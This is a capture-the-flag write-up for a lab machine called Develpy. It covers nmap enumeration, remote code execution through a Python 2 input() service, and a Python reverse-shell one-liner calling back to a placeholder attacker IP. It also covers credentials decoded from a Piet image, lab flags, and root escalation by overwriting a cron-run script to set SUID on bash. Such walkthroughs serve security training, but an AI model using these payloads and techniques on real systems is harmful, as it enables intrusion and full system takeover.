# Develpy CTF Writeup

**Target IP:** 10.49.140.45

## 1. Enumeration

### Nmap Scan
The initial scan revealed two open ports:
- **Port 22 (SSH):** OpenSSH 7.2p2 Ubuntu.
- **Port 10000:** A custom service that returned a Python traceback when probed.

```bash
nmap -sC -sV -oN nmap_initial.txt 10.49.140.45
```

The scan output for port 10000 was particularly interesting:
```
10000/tcp open  snet-sensor-mgmt?
| fingerprint-strings: 
|   GenericLines: 
|     Private 0days
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
```

## 2. Initial Access

### Python input() Vulnerability
The service on port 10000 uses the Python 2 `input()` function. In Python 2, `input()` evaluates the user's input as Python code, which leads to Remote Code Execution (RCE).

We exploited this by sending a payload that imports the `os` module and executes a system command:
```bash
echo "__import__('os').system('id')" | nc 10.49.140.45 10000
```
Output: `uid=1000(king) gid=1000(king) groups=1000(king)...`

### Reverse Shell
We established a reverse shell by sending a Python reverse shell payload through the vulnerable `input()` function:
```bash
echo "__import__('os').system('python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'<attacker_ip>\',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\'/bin/sh\',\'-i\']);\"')" | nc 10.49.140.45 10000
```

## 3. Enumeration as User

### credentials.png and Piet
In `/home/king/`, we found a file named `credentials.png`. This image turned out to be code written in **Piet**, an esoteric programming language where the code looks like abstract art.

Decoding the Piet image revealed the credentials for the user `king`:
- **Username:** `king`
- **Password:** `c00ffe123!`

We used these credentials to gain a stable SSH session.

### User Flag
The user flag was located at `/home/king/user.txt`:
`cf85ff769cfaaa721758949bf870b019`

## 4. Privilege Escalation

### Cron Job Analysis
Checking `/etc/crontab` revealed a root cron job running every minute:
```bash
* * * * * root cd /home/king/ && bash root.sh
```

### Exploiting Writable Script
We examined the permissions of `/home/king/root.sh`:
```bash
ls -la /home/king/root.sh
-rw-rw-r-- 1 king king 35 May  1 22:14 /home/king/root.sh
```
The script was writable by our user. We modified it to set the SUID bit on the bash binary:
```bash
echo 'chmod +s /bin/bash' > /home/king/root.sh
```

### Root Shell
After waiting one minute for the cron job to execute, `/bin/bash` had the SUID bit set (`-rwsr-sr-x`). We then spawned a root shell:
```bash
/bin/bash -p
```

### Root Flag
The root flag was located at `/root/root.txt`:
`9c37646777a53910a347f387dce025ec`

```
